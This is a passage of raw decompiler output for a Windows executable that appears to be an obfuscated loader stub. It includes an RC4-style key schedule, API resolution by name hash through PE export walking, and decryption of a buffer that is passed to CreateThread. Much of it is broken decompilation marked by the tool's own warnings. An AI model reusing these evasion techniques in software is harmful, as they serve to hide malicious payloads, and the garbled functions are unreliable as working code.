/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// int __usercall sub_401198@<eax>(int a1@<esi>);
int __cdecl sub_401459(int a1, int a2, unsigned __int8 *a3);
// int __usercall sub_401A51@<eax>(int a1@<ebp>, int a2@<esi>);
// void __usercall sub_401E73(int a1@<ecx>, int a2@<ebx>);
// void __usercall sub_401EB5(_DWORD *a1@<ebp>);
void sub_401F98();
// void __usercall sub_40202F(int a1@<esi>);
// void __usercall sub_402530(char a1@<sf>, char a2@<of>, int a3@<ecx>, int a4@<ebp>, int a5@<esi>);
unsigned int __cdecl sub_402617(_BYTE *a1);
_BYTE *__cdecl sub_402A03(_BYTE *a1, _BYTE *a2);
void sub_402C6D();
// void __usercall sub_402E6E(unsigned int a1@<ecx>, int a2@<ebx>, void *a3@<edi>, const void *a4@<esi>);
// int __usercall sub_403034@<eax>(int a1@<esi>);
unsigned int __fastcall sub_403835(int a1, int a2);
int sub_405228();
// void __usercall sub_405BD2(unsigned int a1@<eax>, __int16 a2@<dx>, int a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>, __int16 a7@<fpstat>, double a8@<st0>);
__int64 sub_40626B();
// int __usercall sub_407DDF@<eax>(char a1@<cf>, _WORD *a2@<eax>, int a3@<ecx>, _BYTE *a4@<edi>, _BYTE *a5@<esi>);
// void __usercall __noreturn sub_40A4E0(_DWORD *a1@<ecx>, int a2@<edi>);
void sub_411F08();
int __stdcall sub_412196(int a1, int a2, int a3, int a4);
void __stdcall sub_41225B(int a1, int a2);
void start();
// void __userpurge sub_412B71(int a1@<esi>, int a2, int a3);
int __fastcall sub_412D0E(unsigned int a1, unsigned int a2, int a3, int a4, int a5, int a6);
int __cdecl sub_413234(int a1, int a2, int a3, int a4);
int __stdcall sub_41357B(int a1, int a2, int a3);
int __stdcall sub_41362A(int a1, int a2);
int __stdcall sub_4138E5(int a1, int a2);
void sub_413A20();
// void __usercall sub_413DCA(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>);
// int __usercall sub_41405B@<eax>(int a1@<eax>, __int16 a2@<dx>, int a3, int a4, int a5, int a6);
// int __userpurge sub_414566@<eax>(int a1@<ebp>, int a2, int a3, int a4, int a5);
int __stdcall sub_414E31(int a1, int a2, int a3);
// int __userpurge sub_414E6C@<eax>(int result@<eax>, __int16 a2@<dx>, int a3, int a4, int a5, int a6);
// int __usercall sub_414FB7@<eax>(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>);
// int __usercall sub_418D0E@<eax>(_BYTE *a1@<edi>);
// HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// HANDLE __stdcall GetProcessHeap();
// BOOL __stdcall HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// LONG __stdcall InterlockedCompareExchange(volatile LONG *Destination, LONG Exchange, LONG Comperand);
// LONG __stdcall InterlockedIncrement(volatile LONG *lpAddend);
// HLOCAL __stdcall LocalFree(HLOCAL hMem);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN unk_4230E5; // weak
_UNKNOWN unk_4231E5; // weak
int dword_443004 = 0; // weak
int dword_443008 = 0; // weak
int dword_44300C = 0; // weak
int dword_443010 = 0; // weak
int dword_443014 = 0; // weak
int dword_443018 = 0; // weak
int dword_44301C = 0; // weak
int dword_443020 = 0; // weak
int dword_443024 = 0; // weak
int dword_443028 = 0; // weak
int dword_44302C = 0; // weak
int dword_443030 = 0; // weak
int dword_443034 = 0; // weak
int dword_443038 = 0; // weak
int dword_44303C = 0; // weak
int dword_443040 = 0; // weak
int dword_443044 = 0; // weak
int dword_443048 = 0; // weak
int dword_44304C = 0; // weak
int dword_4430CC = 0; // weak
char byte_44317C = '\0'; // weak
char byte_4431B4 = '\0'; // weak
int dword_44329C = 0; // weak
int dword_4432B8 = 0; // weak
int dword_44358C = 227265024; // weak
char byte_4437FC = '…'; // weak
int *off_4439DC = &dword_443020; // weak
char byte_443B38 = '0'; // weak
int *off_443C84 = &dword_443030; // weak
int dword_443DB4 = -1354; // weak
int dword_443EF0 = 1818; // weak
char byte_444160 = '€'; // weak
void *off_444174 = &unk_44483E; // weak
int dword_4441BC = -1280507904; // weak
int dword_444258 = 1073757579; // weak
int dword_444310 = -1695055616; // weak
_UNKNOWN dword_44446C; // weak
int dword_4444E8 = -1160755829; // weak
char byte_4446A0 = 'Y'; // weak
int dword_4446D8 = 1755408127; // weak
int (__thiscall *dword_4447FA)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_4447FE = 0; // weak
int dword_44481A = 0; // weak
int dword_44481E = 0; // weak
int (*dword_444822)(void) = NULL; // weak
int dword_444826 = 521288629; // weak
int dword_44482E = 0; // weak
int dword_444832 = 170000; // weak
int (__fastcall *dword_444846)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_44484A = 0; // weak
int dword_444856 = 362436069; // weak
__int64 (__thiscall *dword_44485E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_444866 = -1955777397; // weak
int (__fastcall *dword_44486E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_444872 = 0; // weak
_UNKNOWN unk_44488A; // weak
int dword_4448A0 = 88675123; // weak
int dword_4448C4 = 152345; // weak
_UNKNOWN unk_4448D0; // weak
int dword_444988 = 0; // weak
int dword_444AC8; // weak
int dword_444B24; // weak


//----- (00401198) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_401198@<eax>(int a1@<esi>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_401A51((int)&savedregs, a1);
}
// 40119B: bad sp value at call

//----- (00401459) --------------------------------------------------------
int __cdecl sub_401459(int a1, int a2, unsigned __int8 *a3)
{
  unsigned int v3; // esi
  _BYTE *v4; // eax
  unsigned __int8 v5; // bl
  unsigned int i; // esi
  char v7; // cl
  int result; // eax
  int v9; // et2
  int v10; // eax
  unsigned __int8 *v11; // [esp+Ch] [ebp-8h]
  unsigned __int8 v12; // [esp+13h] [ebp-1h]

  v3 = 0;
  v4 = a3;
  do
  {
    v7 = v3++;
    *v4++ = v7;
  }
  while ( v3 < 0x100 );
  a3[256] = 0;
  a3[257] = 0;
  v12 = 0;
  v5 = 0;
  v11 = a3;
  for ( i = 0; i < 0x100; ++i )
  {
    v5 = (v5 + *v11 + *(unsigned __int8 *)(a1 + v12)) % 256;
    sub_402A03(&a3[i], &a3[v5]);
    v10 = v12 + 1;
    v9 = v10 % a2;
    result = v10 / a2;
    v12 = v9;
    ++v11;
  }
  return result;
}

//----- (00401A51) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_401A51@<eax>(int a1@<ebp>, int a2@<esi>)
{
  unsigned int i; // esi
  int v4; // eax
  int v5; // ebx
  _DWORD *v6; // edi

  sub_40202F(a2);
  v5 = v4;
  v6 = (_DWORD *)(v4 + *(_DWORD *)(v4 + *(_DWORD *)(v4 + 60) + 120));
  if ( !HIWORD(*(_DWORD *)(a1 + 8)) )
  {
    *(_DWORD *)(a1 - 4) = *(unsigned __int16 *)(a1 + 8) - v6[4];
    return v5 + *(_DWORD *)(v5 + v6[7] + 4 * *(_DWORD *)(a1 - 4));
  }
  *(_DWORD *)(a1 - 8) = v4 + v6[8];
  *(_DWORD *)(a1 - 12) = v4 + v6[9];
  for ( i = 0; v6[6] > i; ++i )
  {
    if ( sub_402617((_BYTE *)(v5 + **(_DWORD **)(a1 - 8))) == *(_DWORD *)(a1 + 8) )
    {
      *(_DWORD *)(a1 - 4) = **(unsigned __int16 **)(a1 - 12);
      break;
    }
    *(_DWORD *)(a1 - 8) += 4;
    *(_DWORD *)(a1 - 12) += 2;
  }
  if ( v6[6] != i )
    return v5 + *(_DWORD *)(v5 + v6[7] + 4 * *(_DWORD *)(a1 - 4));
  return 0;
}
// 4019A9: positive sp value 4 has been found
// 402550: variable 'v4' is possibly undefined

//----- (00401E73) --------------------------------------------------------
void __usercall sub_401E73(int a1@<ecx>, int a2@<ebx>)
{
  unsigned int v2; // edi
  int (*v3)(void); // eax
  char *v4; // eax
  int v5; // eax
  __int16 v6; // cx
  char *v7; // ebx
  __int64 (__thiscall *v8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // eax
  int v9; // ecx
  int (__thiscall *v10)(_DWORD, _DWORD, _DWORD); // eax
  int v11; // ecx
  int *v12; // edi
  char *v13; // ebx
  int v14; // edi
  int v15; // eax

  dword_443030 += a1;
  dword_44301C -= a2;
  v4 = (char *)sub_401198(dword_444310);
  if ( v4 )
  {
    dword_444846 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))v4;
    v13 = v4;
    LOBYTE(v13) = (unsigned __int16)(dword_4430CC + 687) >> 8;
    v10 = (int (__thiscall *)(_DWORD, _DWORD, _DWORD))sub_401198((int)&GetProcessHeap - dword_444258);
    dword_44301C -= v11;
    if ( v10 )
    {
      dword_4447FA = v10;
      v12 = off_443C84;
      v7 = v13 + 28479;
      dword_443004 = 29771;
      v8 = (__int64 (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_401198(dword_443EF0);
      dword_443040 = v9;
      dword_443028 = 6660;
      dword_443034 -= (int)v7;
      if ( v8 )
      {
        dword_44485E = v8;
        v2 = (unsigned int)v12 + 894;
        v3 = (int (*)(void))sub_401198((int)&CreateThread);
        dword_443010 -= (int)v7;
        dword_44301C = 23449;
        if ( v3 )
        {
          dword_443020 = 1916711125;
          dword_444822 = v3;
          dword_44304C += (int)&LocalFree;
          v14 = ((unsigned int)&LocalFree < dword_4432B8) + (v2 ^ 0x3CFB) + 20090;
          v15 = sub_401198((int)&CreateThread);
          LOBYTE(dword_443018) = 13;
          if ( v15 )
          {
            dword_44481A = v15;
            v5 = sub_401198((int)&CreateThread);
            dword_443038 -= v14;
            HIBYTE(v6) = -31;
            if ( v5 )
            {
              dword_44484A = v5;
              LOBYTE(v6) = 107 - byte_4437FC;
              sub_401198(v6);
              JUMPOUT(0x4039AF);
            }
          }
        }
      }
    }
  }
  JUMPOUT(0x4036EE);
}
// 40271A: control flows out of bounds to 4039AF
// 401E9F: control flows out of bounds to 4036EE
// 4032F6: variable 'v11' is possibly undefined
// 403277: variable 'v9' is possibly undefined
// 443004: using guessed type int dword_443004;
// 443010: using guessed type int dword_443010;
// 443018: using guessed type int dword_443018;
// 44301C: using guessed type int dword_44301C;
// 443020: using guessed type int dword_443020;
// 443028: using guessed type int dword_443028;
// 443030: using guessed type int dword_443030;
// 443034: using guessed type int dword_443034;
// 443038: using guessed type int dword_443038;
// 443040: using guessed type int dword_443040;
// 44304C: using guessed type int dword_44304C;
// 4430CC: using guessed type int dword_4430CC;
// 4432B8: using guessed type int dword_4432B8;
// 4437FC: using guessed type char byte_4437FC;
// 443C84: using guessed type int *off_443C84;
// 443EF0: using guessed type int dword_443EF0;
// 444258: using guessed type int dword_444258;
// 444310: using guessed type int dword_444310;
// 4447FA: using guessed type int (__thiscall *dword_4447FA)(_DWORD, _DWORD, _DWORD);
// 44481A: using guessed type int dword_44481A;
// 444822: using guessed type int (*dword_444822)(void);
// 444846: using guessed type int (__fastcall *dword_444846)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 44484A: using guessed type int dword_44484A;
// 44485E: using guessed type __int64 (__thiscall *dword_44485E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401EB5) --------------------------------------------------------
void __usercall sub_401EB5(_DWORD *a1@<ebp>)
{
  char v1; // bl

  v1 = *(_BYTE *)(a1[4] + 256);
  *((_BYTE *)a1 - 1) = *(_BYTE *)(a1[4] + 257);
  *(a1 - 2) = 0;
  *(a1 - 3) = a1[2];
  if ( *(a1 - 2) < a1[3] )
    JUMPOUT(0x401768);
  *(_BYTE *)(a1[4] + 256) = v1;
  *(_BYTE *)(a1[4] + 257) = *((_BYTE *)a1 - 1);
  JUMPOUT(0x401796);
}
// 401A15: control flows out of bounds to 401796
// 401BF0: control flows out of bounds to 401768

//----- (00401F98) --------------------------------------------------------
void sub_401F98()
{
  int v0; // ecx
  int v1; // esi
  int v2; // ebx
  _BYTE *v3; // edi
  int v4; // ecx
  int v5; // edx
  unsigned int v6; // ebx
  char v7; // al
  bool v8; // cf
  int v9; // eax
  int v10; // ecx
  int v11; // ecx
  BOOL (__stdcall **v12)(HANDLE, DWORD, LPVOID); // esi
  int v13; // ebx
  char v14; // al
  int v15; // edx
  int v16; // ecx
  int v17; // ecx
  _BYTE *v18; // edi
  int v19; // esi
  int v20; // eax
  int v21; // [esp-8h] [ebp-8h]
  int v22; // [esp-4h] [ebp-4h]
  int v23; // [esp-4h] [ebp-4h]

  v12 = &HeapFree;
  v17 = 0x2000;
  dword_443014 = 18320;
  v18 = &unk_4231E5;
  LOBYTE(dword_443048) = 36;
  do
  {
    v22 = v17;
    v14 = sub_403034((int)v12);
    v12 = (BOOL (__stdcall **)(HANDLE, DWORD, LPVOID))(v16 + v8 + v15);
    *v18++ = v14;
    v17 = v22 - 1;
  }
  while ( v22 != 1 );
  dword_4447FA(BYTE1(dword_44329C), 255, &unk_4230E5);
  BYTE1(v4) = -115;
  dword_44303C += v5;
  dword_44302C = dword_444846(v4, v5 - dword_4444E8, &unk_4230E5, &unk_44488A, 0, &unk_4448D0);
  dword_443018 = dword_44302C;
  dword_443020 -= (int)&InterlockedCompareExchange;
  LOBYTE(dword_443028) = -30;
  dword_443040 = 2125;
  v23 = dword_44485E(dword_44446C, &unk_4448D0, -1073741824, 1, 0, 2, 32, 0);
  LOBYTE(dword_443018) = -61;
  LOBYTE(dword_443020) = dword_443020 + 34;
  v13 = (dword_444AC8 + 7525) ^ 0x1F18;
  dword_443044 -= (int)off_444174;
  dword_44486E(&InterlockedIncrement, 19325, v23, &unk_4231E5, 0x2000, &dword_4447FE, 0, v23);
  dword_44302C -= v13;
  dword_444822();
  v2 = 2 * (_DWORD)off_4439DC;
  BYTE1(v2) = byte_444160;
  dword_44300C -= v2;
  v0 = 0x2000;
  v1 = dword_4441BC;
  BYTE1(v2) = byte_443B38;
  v3 = &unk_4231E5;
  LOBYTE(dword_443048) = 9;
  LOBYTE(dword_443010) = dword_443010 - 125;
  do
  {
    v19 = dword_444988 + v1;
    LOBYTE(dword_443010) = dword_443010 - 106;
    v21 = v0;
    v6 = dword_443DB4 + v2;
    v7 = sub_403034(v19);
    v1 = v19 - (v8 + 25700);
    v2 = v6 >> 2;
    *v3++ = v7;
    dword_443030 += v1;
    dword_44300C = 11668;
    v8 = (unsigned int)dword_44301C < 0x4CDD;
    dword_44301C -= 19677;
    v0 = v21 - 1;
  }
  while ( v21 != 1 );
  LOBYTE(v2) = byte_44317C;
  BYTE1(v2) = v21 - 1;
  dword_44303C = v2;
  v9 = sub_401198(v1 - (v8 + 19336) + 1);
  v10 = 1769630462;
  LOBYTE(v10) = byte_4446A0;
  v11 = v8 + v10 + 20114;
  if ( v9 )
  {
    dword_4447FE = v9;
    dword_443024 -= v11;
    v20 = sub_401198(dword_44358C);
    if ( v20 )
    {
      dword_44481E = v20;
      JUMPOUT(0x4039D1);
    }
  }
  JUMPOUT(0x4036EE);
}
// 403368: control flows out of bounds to 4039D1
// 401A67: control flows out of bounds to 4036EE
// 4447FA: invalid function type has been ignored
// 444846: invalid function type has been ignored
// 44485E: invalid function type has been ignored
// 444822: invalid function type has been ignored
// 401E0F: conditional instruction was optimized away because of '%0x18.4==1'
// 401CF4: variable 'v5' is possibly undefined
// 401D05: variable 'v4' is possibly undefined
// 401DCD: variable 'v8' is possibly undefined
// 40245F: variable 'v16' is possibly undefined
// 402458: variable 'v15' is possibly undefined
// 44300C: using guessed type int dword_44300C;
// 443010: using guessed type int dword_443010;
// 443014: using guessed type int dword_443014;
// 443018: using guessed type int dword_443018;
// 44301C: using guessed type int dword_44301C;
// 443020: using guessed type int dword_443020;
// 443024: using guessed type int dword_443024;
// 443028: using guessed type int dword_443028;
// 44302C: using guessed type int dword_44302C;
// 443030: using guessed type int dword_443030;
// 44303C: using guessed type int dword_44303C;
// 443040: using guessed type int dword_443040;
// 443044: using guessed type int dword_443044;
// 443048: using guessed type int dword_443048;
// 44317C: using guessed type char byte_44317C;
// 44329C: using guessed type int dword_44329C;
// 44358C: using guessed type int dword_44358C;
// 4439DC: using guessed type int *off_4439DC;
// 443B38: using guessed type char byte_443B38;
// 443DB4: using guessed type int dword_443DB4;
// 444160: using guessed type char byte_444160;
// 444174: using guessed type void *off_444174;
// 4441BC: using guessed type int dword_4441BC;
// 44446C: using guessed type int dword_44446C;
// 4444E8: using guessed type int dword_4444E8;
// 4446A0: using guessed type char byte_4446A0;
// 4447FA: using guessed type int (__thiscall *dword_4447FA)(_DWORD, _DWORD, _DWORD);
// 4447FE: using guessed type int dword_4447FE;
// 44481E: using guessed type int dword_44481E;
// 444822: using guessed type int (*dword_444822)(void);
// 444846: using guessed type int (__fastcall *dword_444846)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 44485E: using guessed type __int64 (__thiscall *dword_44485E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 44486E: using guessed type int (__fastcall *dword_44486E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 444988: using guessed type int dword_444988;
// 444AC8: using guessed type int dword_444AC8;

//----- (0040202F) --------------------------------------------------------
void __usercall sub_40202F(int a1@<esi>)
{
  dword_443030 += a1;
  dword_443038 -= 16004;
  LOBYTE(dword_44302C) = dword_44302C - 92;
  JUMPOUT(0x403B8A);
}
// 401ED5: control flows out of bounds to 403B8A
// 44302C: using guessed type int dword_44302C;
// 443030: using guessed type int dword_443030;
// 443038: using guessed type int dword_443038;

//----- (00402530) --------------------------------------------------------
void __usercall sub_402530(char a1@<sf>, char a2@<of>, int a3@<ecx>, int a4@<ebp>, int a5@<esi>)
{
  *(_DWORD *)(a4 - 32) = a3 + a5 + 7384;
  if ( a1 == a2 )
  {
    *(_DWORD *)(a4 - 36) = *(unsigned __int8 *)(*(_DWORD *)(a4 - 16) - *(_DWORD *)(a4 - 20) + *(_DWORD *)(a4 + 8));
    *(_DWORD *)(a4 - 36) *= 2;
    JUMPOUT(0x4037FE);
  }
  JUMPOUT(0x4010EC);
}
// 402625: control flows out of bounds to 4037FE
// 403491: control flows out of bounds to 4010EC

//----- (00402617) --------------------------------------------------------
unsigned int __cdecl sub_402617(_BYTE *a1)
{
  unsigned int result; // eax

  result = 0;
  while ( *a1 )
    result = (char)*a1++ ^ ((result >> 25) | (result << 7));
  return result;
}

//----- (00402A03) --------------------------------------------------------
_BYTE *__cdecl sub_402A03(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // eax
  char v3; // cl

  result = a1;
  v3 = *a1;
  *a1 = *a2;
  *a2 = v3;
  return result;
}

//----- (00402C6D) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void sub_402C6D()
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  sub_401EB5(&savedregs);
}
// 402C70: bad sp value at call

//----- (00402E6E) --------------------------------------------------------
void __usercall sub_402E6E(unsigned int a1@<ecx>, int a2@<ebx>, void *a3@<edi>, const void *a4@<esi>)
{
  dword_44303C = a2;
  dword_44304C = 31368;
  qmemcpy(a3, a4, a1);
}
// 44303C: using guessed type int dword_44303C;
// 44304C: using guessed type int dword_44304C;

//----- (00403034) --------------------------------------------------------
int __usercall sub_403034@<eax>(int a1@<esi>)
{
  int v1; // ebx
  unsigned int v2; // eax
  int result; // eax

  dword_44300C = a1;
  v2 = dword_4448C4 ^ (dword_4448C4 << 11);
  LOBYTE(dword_443020) = dword_443020 + 120;
  dword_4448C4 = dword_444856;
  dword_443044 = 8525;
  dword_444856 = dword_444826;
  dword_443004 -= __CFADD__(byte_4431B4, (unsigned __int16)(-13168 - dword_444B24) >> 8) + dword_4446D8 + 31717;
  dword_444826 = dword_4448A0;
  v1 = v2;
  dword_44301C -= v2;
  BYTE1(v1) = BYTE1(v2) + 110;
  dword_443048 = v1;
  dword_443018 = 11974;
  dword_443008 += 41538;
  dword_4448A0 ^= (v2 >> 8) ^ v2 ^ ((unsigned int)dword_4448A0 >> 19);
  dword_44482E = dword_4448A0;
  result = dword_4448A0;
  dword_443004 -= 15715;
  return result;
}
// 443004: using guessed type int dword_443004;
// 443008: using guessed type int dword_443008;
// 44300C: using guessed type int dword_44300C;
// 443018: using guessed type int dword_443018;
// 44301C: using guessed type int dword_44301C;
// 443020: using guessed type int dword_443020;
// 443044: using guessed type int dword_443044;
// 443048: using guessed type int dword_443048;
// 4431B4: using guessed type char byte_4431B4;
// 4446D8: using guessed type int dword_4446D8;
// 444826: using guessed type int dword_444826;
// 44482E: using guessed type int dword_44482E;
// 444856: using guessed type int dword_444856;
// 4448A0: using guessed type int dword_4448A0;
// 4448C4: using guessed type int dword_4448C4;
// 444B24: using guessed type int dword_444B24;

//----- (00403835) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
unsigned int __fastcall sub_403835(int a1, int a2)
{
  unsigned int result; // eax
  int v3; // [esp-4h] [ebp-4h]

  dword_443018 += a1;
  dword_444866 ^= a2 + 799;
  result = v3 & 0xFFFF0000;
  dword_444872 = v3 & 0xFFFF0000;
  LOBYTE(dword_443048) = dword_443048 + 83;
  return result;
}
// 402614: positive sp value 4 has been found
// 4030C5: variable 'v3' is possibly undefined
// 443018: using guessed type int dword_443018;
// 443048: using guessed type int dword_443048;
// 444866: using guessed type int dword_444866;
// 444872: using guessed type int dword_444872;

//----- (00405228) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int sub_405228()
{
  int v0; // ecx
  unsigned __int32 v1; // eax
  unsigned __int16 v3; // [esp-1Ch] [ebp-1Ch]
  int v4; // [esp-18h] [ebp-18h]
  unsigned int v5; // [esp-8h] [ebp-8h]
  void *retaddr[2]; // [esp+0h] [ebp+0h]

  v0 = v4;
  *(_DWORD *)v5 ^= v5;
  v1 = __indword(v3);
  return MK_FP(retaddr[0], retaddr[0])(v0);
}
// 40522A: positive sp value 20 has been found
// 405228: could not find valid save-restore pair for ebx
// 405228: could not find valid save-restore pair for ebp
// 405228: could not find valid save-restore pair for edi
// 405228: could not find valid save-restore pair for esi
// 405229: variable 'v4' is possibly undefined
// 40522A: variable 'v5' is possibly undefined
// 40522C: variable 'v3' is possibly undefined

//----- (00405BD2) --------------------------------------------------------
void __usercall sub_405BD2(unsigned int a1@<eax>, __int16 a2@<dx>, int a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>, __int16 a7@<fpstat>, double a8@<st0>)
{
  unsigned __int32 v8; // eax
  char v9; // cf
  unsigned int v10; // [esp-20h] [ebp-24h]

  *(_WORD *)(a1 - 101) = a7;
  MEMORY[0xAE8FA329] = (char)MEMORY[0xAE8FA329] >> a3;
  BYTE1(a1) = __ROR1__(BYTE1(a1), 1);
  v10 = a1;
  *(_BYTE *)(MEMORY[0x1723664B] + 1047856763) = -54;
  LOBYTE(a4) = 54;
  *(_BYTE *)(a5 - 16) = a2;
  v8 = __indword(0xD9u);
  *(_QWORD *)(a4 + 633389444) = (__int64)a8;
  __writeeflags(v10);
  if ( a3 )
  {
    _disable();
    __halt();
  }
  MEMORY[0xE5D22FB5] += HIBYTE(a2) + v9;
  __asm { jmp     dword ptr [esi] }
}
// 405C4A: variable 'v9' is possibly undefined

//----- (0040626B) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
__int64 sub_40626B()
{
  __int64 v1; // [esp-24h] [ebp-24h]

  return v1;
}
// 40626F: positive sp value 24 has been found
// 40626B: variable 'v1' is possibly undefined

//----- (00407DDF) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_407DDF@<eax>(char a1@<cf>, _WORD *a2@<eax>, int a3@<ecx>, _BYTE *a4@<edi>, _BYTE *a5@<esi>)
{
  __int16 v6; // [esp-2h] [ebp-2h] BYREF
  void *retaddr[2]; // [esp+0h] [ebp+0h]

  __ES__ = *a2;
  __outbyte(0x21u, (unsigned __int8)a2);
  *a4 = *a5;
  if ( a1 )
    return MEMORY[0xECB4A1E4]() - 1;
  if ( (int)&v6 > 0 )
  {
    *(_BYTE *)(a3 + 126648492) |= 0x51u;
    __asm { icebp }
  }
  else
  {
    MEMORY[0x5D0A589B](a3, 536599570);
  }
  return MK_FP(retaddr[0], retaddr[0])();
}
// 407DEF: positive sp value 2 has been found

//----- (0040A4E0) --------------------------------------------------------
void __usercall __noreturn sub_40A4E0(_DWORD *a1@<ecx>, int a2@<edi>)
{
  *a1 -= a2;
  JUMPOUT(0x9EB609AF);
}
// 40A4E6: control flows out of bounds to 9EB609AF

//----- (00411F08) --------------------------------------------------------
void sub_411F08()
{
  JUMPOUT(0x413659);
}
// 412670: control flows out of bounds to 413659

//----- (00412196) --------------------------------------------------------
int __stdcall sub_412196(int a1, int a2, int a3, int a4)
{
  int v4; // eax
  __int16 v5; // dx
  int v6; // ecx
  int v7; // eax
  unsigned int v8; // ecx
  int v9; // eax
  __int16 v11; // ax
  char v12; // cf
  char v13[12]; // [esp+24h] [ebp-1DCh] BYREF
  char v14[8]; // [esp+30h] [ebp-1D0h] BYREF
  char v15[76]; // [esp+38h] [ebp-1C8h] BYREF
  int v16; // [esp+84h] [ebp-17Ch]
  int v17; // [esp+9Ch] [ebp-164h]
  unsigned int v18; // [esp+118h] [ebp-E8h]
  char v19[16]; // [esp+164h] [ebp-9Ch] BYREF
  char v20[16]; // [esp+174h] [ebp-8Ch] BYREF
  int v21; // [esp+198h] [ebp-68h]
  int v22; // [esp+1B8h] [ebp-48h]

  v4 = (sub_4138E5(24, (int)v20) & 0x1E50) + 15102;
  v7 = ((v18 ^ v4) < 0xA73) + (v18 ^ v4) - 2675 + 6407;
  if ( v6 || (v5 & 0x903) == 0 )
    v17 -= v7;
  v11 = sub_412D0E((unsigned int)v13, 0, 0, v16, (int)v13, 0);
  v21 += (v11 - (v12 + 11666)) & 0x26C | 0x25B6;
  sub_4138E5(23, (int)v14);
  sub_412D0E(0, (unsigned int)v19, 0, v22, (int)v19, 0);
  v9 = sub_412D0E(v8, 0, 0, -656810509, (int)v15, 0);
  return v12 + v9 + 8320;
}
// 4123E1: conditional instruction was optimized away because of 'ecx.4==0'
// 4123E7: variable 'v5' is possibly undefined
// 414B9F: variable 'v12' is possibly undefined
// 412AF2: variable 'v8' is possibly undefined
// 415054: variable 'v6' is possibly undefined

//----- (0041225B) --------------------------------------------------------
void __stdcall sub_41225B(int a1, int a2)
{
  char v2[116]; // [esp+150h] [ebp-A0h] BYREF
  int v3; // [esp+1C4h] [ebp-2Ch]

  sub_412D0E(0, 0, 0, v3, (int)v2, 0);
  sub_411F08();
}

//----- (0041284E) --------------------------------------------------------
void start()
{
  JUMPOUT(0x4136F4);
}
// 412CEC: control flows out of bounds to 4136F4

//----- (00412B71) --------------------------------------------------------
void __userpurge sub_412B71(int a1@<esi>, int a2, int a3)
{
  int v3; // ecx
  unsigned int v4; // ecx
  unsigned int v5; // edx
  int v6; // ecx
  int v7; // edx
  unsigned int v8; // ecx
  unsigned int v9; // eax
  int v10; // eax
  unsigned int v11; // edx
  int v12; // ecx
  int v13; // eax
  unsigned int v14; // ecx
  int v15; // eax
  unsigned int v16; // ecx
  int v17; // eax
  unsigned int v18; // edx
  unsigned int v19; // ecx
  int v20; // eax
  bool v21; // cf
  int v22; // eax
  int v23; // eax
  int v24; // edx
  __int16 v25; // ax
  int v26; // eax
  int v27; // eax
  int v28; // [esp-4h] [ebp-254h]
  char v29[8]; // [esp+Ch] [ebp-244h] BYREF
  int v30[3]; // [esp+14h] [ebp-23Ch] BYREF
  char v31[8]; // [esp+20h] [ebp-230h] BYREF
  int v32; // [esp+28h] [ebp-228h]
  char v33[4]; // [esp+30h] [ebp-220h] BYREF
  unsigned int v34; // [esp+34h] [ebp-21Ch]
  char v35[20]; // [esp+44h] [ebp-20Ch] BYREF
  char v36[8]; // [esp+58h] [ebp-1F8h] BYREF
  char v37[4]; // [esp+6Ch] [ebp-1E4h] BYREF
  int v38; // [esp+70h] [ebp-1E0h]
  int v39; // [esp+7Ch] [ebp-1D4h]
  int v40; // [esp+84h] [ebp-1CCh]
  int v41; // [esp+A0h] [ebp-1B0h]
  char v42[20]; // [esp+C8h] [ebp-188h] BYREF
  int v43; // [esp+E0h] [ebp-170h]
  char v44[24]; // [esp+ECh] [ebp-164h] BYREF
  char v45[24]; // [esp+1A0h] [ebp-B0h] BYREF
  char v46[24]; // [esp+1B8h] [ebp-98h] BYREF
  char v47[12]; // [esp+1D4h] [ebp-7Ch] BYREF
  unsigned int v48; // [esp+1E0h] [ebp-70h]
  int v49; // [esp+20Ch] [ebp-44h]
  int v50; // [esp+240h] [ebp-10h]

  sub_4138E5(39, (int)v33);
  sub_41225B(10, v43);
  sub_41225B(1, v3);
  sub_412D0E(v4, 0, 0, (int)v47, (int)v47, 0);
  sub_4138E5(23, (int)v47);
  sub_41225B(9, 2136167811);
  sub_403034(a1);
